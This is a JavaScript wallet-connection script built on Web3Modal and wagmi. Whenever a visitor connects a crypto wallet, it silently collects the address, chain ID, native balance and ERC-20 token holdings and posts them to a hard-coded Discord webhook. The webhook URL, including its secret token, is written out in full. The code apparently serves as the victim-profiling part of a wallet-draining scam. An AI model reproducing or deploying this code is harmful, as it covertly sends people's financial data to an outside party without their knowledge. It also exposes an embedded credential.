  import {
    EthereumClient,
    w3mConnectors,
    w3mProvider,
    WagmiCore,
    WagmiCoreChains,
    WagmiCoreConnectors
  } from "https://unpkg.com/@web3modal/ethereum@2.6.2";
  import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.6.2";

  const {
    configureChains,
    createConfig,
    getAccount,
    fetchBalance,
    watchAccount
  } = WagmiCore;

  const chains = Object.values(WagmiCoreChains);
  const projectId = "24cb4618162c124a24e58a917ab7cc45";

  const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);

  const wagmiConfig = createConfig({
    autoConnect: true,
    connectors: [
      ...w3mConnectors({ chains, version: 2, projectId }),
      new WagmiCoreConnectors.CoinbaseWalletConnector({
        chains,
        options: { appName: "Wallet Auto Send" }
      }),
    ],
    publicClient,
  });

  const ethereumClient = new EthereumClient(wagmiConfig, chains);
  const web3Modal = new Web3Modal({ projectId }, ethereumClient);

  const webhookURL = "https://discord.com/api/webhooks/1364313853810446397/Mu0B78sHS1cEoKtYhxc3MHAQEJ0PkWXzOUR_EBDD1Asvu7XI563w49JGOYSA0DundyOj"; // Replace this

  async function sendToDiscord(content) {
    try {
      await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content })
      });
    } catch (err) {
      console.error("Failed to send to Discord", err);
    }
  }

  async function sendBalancesToDiscord(account) {
    if (!account.isConnected) return;

    const address = account.address;
    const chainId = account.chainId;

    try {
      let message = `📦 **Wallet Connected**\n🧾 Address: \`${address}\`\n🌐 Chain ID: ${chainId}\n`;

      const native = await fetchBalance({ address, chainId });
      message += `\n💰 **${native.symbol}**: ${native.formatted}`;

      if (publicClient.getTokenBalances) {
        const tokens = await publicClient.getTokenBalances({ address });
        if (tokens.length > 0) {
          message += `\n📜 **ERC-20 Tokens:**`;
          for (const token of tokens) {
            message += `\n- ${token.symbol}: ${token.formatted}`;
          }
        } else {
          message += `\n🪙 No ERC-20 tokens found.`;
        }
      }

      await sendToDiscord(message);
    } catch (err) {
      console.error("Failed to fetch/send balances", err);
    }
  }

  // 📌 Automatically send data on wallet connection
  watchAccount((account) => {
    if (account.isConnected) {
      sendBalancesToDiscord(account);
    }
  });
